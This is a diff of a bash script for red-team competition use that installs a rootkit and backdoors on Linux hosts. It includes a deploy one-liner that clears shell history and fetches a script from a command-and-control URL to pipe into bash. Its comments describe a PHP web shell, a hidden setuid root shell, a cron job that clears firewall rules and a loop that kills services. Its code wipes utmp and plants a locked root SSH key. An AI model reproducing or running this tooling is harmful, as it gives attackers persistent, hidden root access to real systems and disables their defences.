@@ -1,12 +1,15 @@
 #!/bin/bash
 #cmc
+#sapling
 #3/6/15
 #install rootkit & backd00rz
 #kill services
 #why jericho? 
 #because tony stark. https://www.youtube.com/watch?v=YBC1Qob27sM&t=38s
 #h4xh4xh4x
-#TO DEPLOY, run: export HISTFILE=/dev/null; wget -q $C2_URL/jericho2.sh -O /dev/stdout | /bin/bash - && history -c
+#note to random github threatresearcher:
+#this is for redteam competition use. no leet haxors here. move along.
+#TO DEPLOY, run: export HISTFILE=/dev/null; wget -q $C2_URL/jericho2.1.sh -O /dev/stdout | /bin/bash - && history -c
 #
 # this creates 5 ways back in:
 # 1) rootkit (CentOSx64)
@@ -16,7 +19,7 @@
 # 5) backdoored 'bin' system account (with setuid(0) shell in "/dev/  /" for re-elevation)
 #
 #  Also removes errbuddy from `who`
-#  Also installs root crontab to clear iptables rules every 5m. (disabled/uncomment below if needed)
+#  Also installs root crontab to clear iptables rules every 5m. (disabled/uncomment iptables stuff below if needed)
 #  Also runs a bash script that takes down all services every 10s.
 #  Also drops a basic php shell in webdirs. http://url/.src.php?e=uptime
 # 
@@ -69,6 +72,7 @@ function do_backdoors() {
         echo "removing utmp.."
         rm -rf /var/run/utmp
         echo "installing root ssh key!"
+        chattr -i /root/.ssh/authorized*
         echo $SHARED_PUBKEY >> /root/.ssh/authorized_keys2
         echo $SHARED_PUBKEY >> /root/.ssh/authorized_keys
         chattr +i /root/.ssh/authorized_keys*
